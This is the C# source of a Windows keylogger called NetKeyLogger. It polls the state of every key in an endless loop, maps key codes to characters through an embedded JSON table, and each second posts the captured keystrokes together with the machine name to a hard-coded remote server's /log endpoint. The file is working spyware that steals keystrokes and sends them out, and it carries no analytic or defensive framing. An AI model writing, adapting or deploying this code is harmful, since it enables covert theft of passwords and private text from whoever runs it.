using Newtonsoft.Json;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

namespace NetKeyLogger
{
    internal class Program
    {

        static List<keys> keys = new List<keys>();
        static private Uri url;
        static private string machineName;
        static private KeyValuePair<string, string> machineNameFormData;
        static private HttpClient server = new HttpClient();
        static private string str;

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args)
        {
            url = new Uri("http://10.11.97.215:5000");

            //url = new Uri( args[0]);

            machineName = System.Environment.MachineName;

            machineNameFormData = new KeyValuePair<string, string>("name", machineName);

            keys = GetKeys();

            KeyLogger();
        }

        static void KeyLogger()
        {
            keys? letter = null;
            str = "";
            Timer timer = new Timer(TimerCallback, null, TimeSpan.FromSeconds(1), TimeSpan.FromSeconds(1));
            while (true)
            {
                for (int i = 0; i < 255; i++)
                {
                    if (GetAsyncKeyState(i) == 32769)
                    {
                        letter = keys.FirstOrDefault(x => x.digit == i);

                        string l = string.Empty;

                        if (letter != null)
                        {

                            l = letter.value;
                        }
                        else
                        {
                            l = i.ToString();
                        }
                        str += l;
                    }

                }
            }
        }


        static void WriteOutput(string value)
        {
            KeyValuePair<string, string> logFormData = new KeyValuePair<string, string>("key", value);

            string requestResult = server.PostAsync(url + "/log", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> {
                machineNameFormData,
                logFormData
             })).Result.Content.ReadAsStringAsync().Result;

            System.Console.WriteLine(requestResult);
            str = "";

            //Console.WriteLine(value);
        }

        static void TimerCallback(object state)
        {
            WriteOutput(str);
        }

        static List<keys> GetKeys()
        {
            var keys = new List<keys>();
            string jsonString = @"
            [
                      {
                        ""digit"": 1,
                        ""value"": """"
                      },
                      {
                        ""digit"": 2,
                        ""value"": """"
                      },
                      {
                        ""digit"": 8,
                        ""value"": """"
                      },
                      {
                        ""digit"": 9,
                        ""value"": ""[TAB]""
                      },
                      {
                        ""digit"": 13,
                        ""value"": ""[Enter]""
                      },
                      {
                        ""digit"": 16,
                        ""value"": ""[Shift]""
                      },
                      {
                        ""digit"": 17,
                        ""value"": """"
                      },
                      {
                        ""digit"": 19,
                        ""value"": ""[Pause]""
                      },
                      {
                        ""digit"": 20,
                        ""value"": ""[Caps Lock]""
                      },
                      {
                        ""digit"": 27,
                        ""value"": ""[Esc]""
                      },
                      {
                        ""digit"": 32,
                        ""value"": "" ""
                      },
                      {
                        ""digit"": 33,
                        ""value"": ""[Page Up]""
                      },
                      {
                        ""digit"": 34,
                        ""value"": ""[Page Down]""
                      },
                      {
                        ""digit"": 35,
                        ""value"": ""[End]""
                      },
                      {
                        ""digit"": 36,
                        ""value"": ""[Home]""
                      },
                      {
                        ""digit"": 37,
                        ""value"": ""[Left]""
                      },
                      {
                        ""digit"": 38,
                        ""value"": ""[Up]""
                      },
                      {
                        ""digit"": 39,
                        ""value"": ""[Right]""
                      },
                      {
                        ""digit"": 40,
                        ""value"": ""[Down]""
                      },
                      {
                        ""digit"": 44,
                        ""value"": ""[Print Screen]""
                      },
                      {
                        ""digit"": 45,
                        ""value"": ""[Insert]""
                      },
                      {
                        ""digit"": 46,
                        ""value"": ""[Delete]""
                      },
                      {
                        ""digit"": 48,
                        ""value"": ""0""
                      },
                      {
                        ""digit"": 49,
                        ""value"": ""1""
                      },
                      {
                        ""digit"": 50,
                        ""value"": ""2""
                      },
                      {
                        ""digit"": 51,
                        ""value"": ""3""
                      },
                      {
                        ""digit"": 52,
                        ""value"": ""4""
                      },
                      {
                        ""digit"": 53,
                        ""value"": ""5""
                      },
                      {
                        ""digit"": 54,
                        ""value"": ""6""
                      },
                      {
                        ""digit"": 55,
                        ""value"": ""7""
                      },
                      {
                        ""digit"": 56,
                        ""value"": ""8""
                      },
                      {
                        ""digit"": 57,
                        ""value"": ""9""
                      },
                      {
                        ""digit"": 65,
                        ""value"": ""a""
                      },
                      {
                        ""digit"": 66,
                        ""value"": ""b""
                      },
                      {
                        ""digit"": 67,
                        ""value"": ""c""
                      },
                      {
                        ""digit"": 68,
                        ""value"": ""d""
                      },
                      {
                        ""digit"": 69,
                        ""value"": ""e""
                      },
                      {
                        ""digit"": 70,
                        ""value"": ""f""
                      },
                      {
                        ""digit"": 71,
                        ""value"": ""g""
                      },
                      {
                        ""digit"": 72,
                        ""value"": ""h""
                      },
                      {
                        ""digit"": 73,
                        ""value"": ""i""
                      },
                      {
                        ""digit"": 74,
                        ""value"": ""j""
                      },
                      {
                        ""digit"": 75,
                        ""value"": ""k""
                      },
                      {
                        ""digit"": 76,
                        ""value"": ""l""
                      },
                      {
                        ""digit"": 77,
                        ""value"": ""m""
                      },
                      {
                        ""digit"": 78,
                        ""value"": ""n""
                      },
                      {
                        ""digit"": 79,
                        ""value"": ""o""
                      },
                      {
                        ""digit"": 80,
                        ""value"": ""p""
                      },
                      {
                        ""digit"": 81,
                        ""value"": ""q""
                      },
                      {
                        ""digit"": 82,
                        ""value"": ""r""
                      },
                      {
                        ""digit"": 83,
                        ""value"": ""s""
                      },
                      {
                        ""digit"": 84,
                        ""value"": ""t""
                      },
                      {
                        ""digit"": 85,
                        ""value"": ""u""
                      },
                      {
                        ""digit"": 86,
                        ""value"": ""v""
                      },
                      {
                        ""digit"": 87,
                        ""value"": ""w""
                      },
                      {
                        ""digit"": 88,
                        ""value"": ""x""
                      },
                      {
                        ""digit"": 89,
                        ""value"": ""y""
                      },
                      {
                        ""digit"": 90,
                        ""value"": ""z""
                      },
                      {
                        ""digit"": 91,
                        ""value"": ""[Windows]""
                      },
                      {
                        ""digit"": 92,
                        ""value"": ""[Windows]""
                      },
                      {
                        ""digit"": 93,
                        ""value"": ""[List]""
                      },
                      {
                        ""digit"": 96,
                        ""value"": ""0""
                      },
                      {
                        ""digit"": 97,
                        ""value"": ""1""
                      },
                      {
                        ""digit"": 98,
                        ""value"": ""2""
                      },
                      {
                        ""digit"": 99,
                        ""value"": ""3""
                      },
                      {
                        ""digit"": 100,
                        ""value"": ""4""
                      },
                      {
                        ""digit"": 101,
                        ""value"": ""5""
                      },
                      {
                        ""digit"": 102,
                        ""value"": ""6""
                      },
                      {
                        ""digit"": 103,
                        ""value"": ""7""
                      },
                      {
                        ""digit"": 104,
                        ""value"": ""8""
                      },
                      {
                        ""digit"": 105,
                        ""value"": ""9""
                      },
                      {
                        ""digit"": 106,
                        ""value"": ""*""
                      },
                      {
                        ""digit"": 107,
                        ""value"": ""+""
                      },
                      {
                        ""digit"": 109,
                        ""value"": ""-""
                      },
                      {
                        ""digit"": 110,
                        ""value"": "",""
                      },
                      {
                        ""digit"": 111,
                        ""value"": ""/""
                      },
                      {
                        ""digit"": 112,
                        ""value"": ""[F1]""
                      },
                      {
                        ""digit"": 113,
                        ""value"": ""[F2]""
                      },
                      {
                        ""digit"": 114,
                        ""value"": ""[F3]""
                      },
                      {
                        ""digit"": 115,
                        ""value"": ""[F4]""
                      },
                      {
                        ""digit"": 116,
                        ""value"": ""[F5]""
                      },
                      {
                        ""digit"": 117,
                        ""value"": ""[F6]""
                      },
                      {
                        ""digit"": 118,
                        ""value"": ""[F7]""
                      },
                      {
                        ""digit"": 119,
                        ""value"": ""[F8]""
                      },
                      {
                        ""digit"": 120,
                        ""value"": ""[F9]""
                      },
                      {
                        ""digit"": 121,
                        ""value"": ""[F10]""
                      },
                      {
                        ""digit"": 122,
                        ""value"": ""[F11]""
                      },
                      {
                        ""digit"": 123,
                        ""value"": ""[F12]""
                      },
                      {
                        ""digit"": 144,
                        ""value"": ""[Num Lock]""
                      },
                      {
                        ""digit"": 145,
                        ""value"": ""[Scroll Lock]""
                      },
{
                        ""digit"": 160,
                        ""value"": """"
                      },
                      {
                        ""digit"": 162,
                        ""value"": ""[Ctrl]""
                      },
                      {
                        ""digit"": 163,
                        ""value"": ""[Ctrl]""
                      },
                      {
                        ""digit"": 164,
                        ""value"": ""[Alt]""
                      },
                      {
                        ""digit"": 165,
                        ""value"": ""[Alt]""
                      },
                      {
                        ""digit"": 188,
                        ""value"": "",""
                      },
                      {
                        ""digit"": 189,
                        ""value"": ""-""
                      },

                      {
                        ""digit"": 190,
                        ""value"": "".""
                      },
                      {
                        ""digit"": 222,
                        ""value"": ""'""
                      },
                      {
                        ""digit"": 226,
                        ""value"": ""\\""
                      }
            ]";

            keys = JsonConvert.DeserializeObject<List<keys>>(jsonString);
            return keys;
        }
    }
    public class keys
    {
        public int digit { get; set; }
        public string value { get; set; }
    }
}
